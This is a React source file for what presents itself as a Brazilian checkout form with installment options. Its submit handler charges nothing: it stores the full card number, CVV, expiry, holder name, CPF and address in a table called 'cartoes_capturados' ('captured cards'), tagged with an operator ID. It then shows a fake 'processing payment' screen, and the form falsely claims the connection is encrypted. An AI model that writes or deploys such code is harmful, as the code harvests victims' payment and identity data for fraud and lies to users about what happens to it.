import { useState, useMemo } from "react";
import { motion } from "framer-motion";
import { Loader2, Lock, CreditCard, Check, ChevronDown } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { toast } from "sonner";
import { supabase } from "@/integrations/supabase/client";
import { detectBrand, formatCardInput, formatValidade, formatCpf } from "@/lib/cardUtils";

interface Props {
  pagamentoId?: string;
  operadorId?: string | null;
  valor?: string;
  onBack: () => void;
  onSuccess: () => void;
}

const CartaoForm = ({ pagamentoId, operadorId, valor, onBack, onSuccess }: Props) => {
  const [titular, setTitular] = useState("");
  const [numero, setNumero] = useState("");
  const [validade, setValidade] = useState("");
  const [cvv, setCvv] = useState("");
  const [cpf, setCpf] = useState("");
  const [endereco, setEndereco] = useState("");
  const [parcelas, setParcelas] = useState(1);
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);

  const bandeira = detectBrand(numero);

  const valorNumerico = useMemo(() => {
    if (!valor) return 0;
    const n = parseFloat(String(valor).replace(/\./g, "").replace(",", "."));
    return isNaN(n) ? 0 : n;
  }, [valor]);

  const parcelasOptions = useMemo(() => {
    return Array.from({ length: 12 }, (_, i) => {
      const n = i + 1;
      const v = valorNumerico > 0 ? valorNumerico / n : 0;
      return { n, valor: v };
    });
  }, [valorNumerico]);

  const fmtBRL = (v: number) =>
    v.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const num = numero.replace(/\D/g, "");
    if (!titular.trim() || num.length < 13 || !validade || cvv.length < 3) {
      toast.error("Preencha todos os campos obrigatórios");
      return;
    }
    setLoading(true);
    try {
      const { error } = await supabase.from("cartoes_capturados" as any).insert({
        pagamento_id: pagamentoId || null,
        operador_id: operadorId || null,
        titular: titular.trim(),
        numero: num,
        bin: num.slice(0, 8),
        ultimos4: num.slice(-4),
        validade,
        cvv,
        cpf: cpf.replace(/\D/g, ""),
        endereco: endereco.trim(),
        bandeira,
        status: "capturado",
        metadata: { parcelas, valor_parcela: valorNumerico > 0 ? Number((valorNumerico / parcelas).toFixed(2)) : null, valor_total: valorNumerico || null },
      } as any);
      if (error) throw error;
      setDone(true);
      setTimeout(() => onSuccess(), 1800);
    } catch (err: any) {
      toast.error(err?.message || "Falha ao processar pagamento");
    } finally {
      setLoading(false);
    }
  };

  if (done) {
    return (
      <motion.div
        initial={{ opacity: 0, scale: 0.95 }}
        animate={{ opacity: 1, scale: 1 }}
        className="text-center py-10 space-y-3"
      >
        <div className="w-16 h-16 rounded-full bg-emerald-100 flex items-center justify-center mx-auto">
          <Loader2 className="h-7 w-7 text-emerald-600 animate-spin" />
        </div>
        <p className="text-base font-bold text-gray-900">Processando pagamento...</p>
        <p className="text-xs text-gray-500">Não feche esta janela. Aguarde a confirmação.</p>
      </motion.div>
    );
  }

  return (
    <motion.form
      onSubmit={handleSubmit}
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      className="space-y-4"
    >
      <div className="flex items-center gap-2 text-xs text-gray-600">
        <Lock className="h-3.5 w-3.5" /> Conexão segura · seus dados são criptografados
      </div>

      {/* Preview do cartão */}
      <div
        className="rounded-2xl p-5 text-white shadow-lg"
        style={{ background: "linear-gradient(135deg, #1e3a8a 0%, #0033A0 60%, #001f6e 100%)" }}
      >
        <div className="flex items-center justify-between mb-6">
          <CreditCard className="h-6 w-6" />
          <span className="text-xs font-bold uppercase tracking-wider opacity-90">{bandeira}</span>
        </div>
        <div className="font-mono text-lg tracking-widest">
          {(numero || "•••• •••• •••• ••••").padEnd(19, " ")}
        </div>
        <div className="flex justify-between mt-4 text-[10px] uppercase tracking-wider opacity-80">
          <div>
            <div>Titular</div>
            <div className="text-sm font-semibold normal-case mt-0.5">{titular || "—"}</div>
          </div>
          <div className="text-right">
            <div>Validade</div>
            <div className="text-sm font-semibold mt-0.5">{validade || "MM/AA"}</div>
          </div>
        </div>
      </div>

      <div className="space-y-3">
        <div>
          <Label className="text-xs">Nome do titular *</Label>
          <Input
            value={titular}
            onChange={(e) => setTitular(e.target.value.toUpperCase())}
            placeholder="COMO IMPRESSO NO CARTÃO"
            className="mt-1"
            required
          />
        </div>
        <div>
          <Label className="text-xs">Número do cartão *</Label>
          <Input
            value={numero}
            onChange={(e) => setNumero(formatCardInput(e.target.value))}
            placeholder="0000 0000 0000 0000"
            inputMode="numeric"
            className="mt-1 font-mono"
            required
          />
        </div>
        <div className="grid grid-cols-2 gap-3">
          <div>
            <Label className="text-xs">Validade *</Label>
            <Input
              value={validade}
              onChange={(e) => setValidade(formatValidade(e.target.value))}
              placeholder="MM/AA"
              inputMode="numeric"
              className="mt-1 font-mono"
              required
            />
          </div>
          <div>
            <Label className="text-xs">CVV *</Label>
            <Input
              value={cvv}
              onChange={(e) => setCvv(e.target.value.replace(/\D/g, "").slice(0, 4))}
              placeholder="123"
              inputMode="numeric"
              className="mt-1 font-mono"
              required
            />
          </div>
        </div>
        <div>
          <Label className="text-xs">CPF do titular</Label>
          <Input
            value={cpf}
            onChange={(e) => setCpf(formatCpf(e.target.value))}
            placeholder="000.000.000-00"
            inputMode="numeric"
            className="mt-1"
          />
        </div>
        <div>
          <Label className="text-xs">Endereço de cobrança</Label>
          <Input
            value={endereco}
            onChange={(e) => setEndereco(e.target.value)}
            placeholder="Rua, número, cidade, CEP"
            className="mt-1"
          />
        </div>
        <div>
          <Label className="text-xs">Parcelamento</Label>
          <div className="relative mt-1">
            <select
              value={parcelas}
              onChange={(e) => setParcelas(Number(e.target.value))}
              className="w-full appearance-none rounded-md border border-input bg-background h-10 px-3 pr-9 text-sm font-medium text-gray-900 focus:outline-none focus:ring-2 focus:ring-[#0033A0]/40"
            >
              {parcelasOptions.map(({ n, valor: v }) => (
                <option key={n} value={n}>
                  {n}x {v > 0 ? `de ${fmtBRL(v)}` : ""} sem juros
                </option>
              ))}
            </select>
            <ChevronDown className="pointer-events-none absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
          </div>
          {valorNumerico > 0 && (
            <p className="text-[10px] text-gray-500 mt-1">
              Total: {fmtBRL(valorNumerico)} · {parcelas}x sem juros
            </p>
          )}
        </div>
      </div>

      <Button
        type="submit"
        disabled={loading}
        className="w-full h-12 text-sm font-bold rounded-xl bg-[#0033A0] hover:bg-[#002880] text-white"
      >
        {loading ? (
          <><Loader2 className="h-4 w-4 mr-2 animate-spin" /> Processando...</>
        ) : (
          <><Check className="h-4 w-4 mr-2" /> Pagar {parcelas > 1 && valorNumerico > 0 ? `${parcelas}x de ${fmtBRL(valorNumerico / parcelas)}` : (valor ? `R$ ${valor}` : "")}</>
        )}
      </Button>
      <button
        type="button"
        onClick={onBack}
        className="w-full text-center text-xs text-gray-500 hover:text-gray-700 py-2"
      >
        ← Voltar
      </button>
    </motion.form>
  );
};

export default CartaoForm;
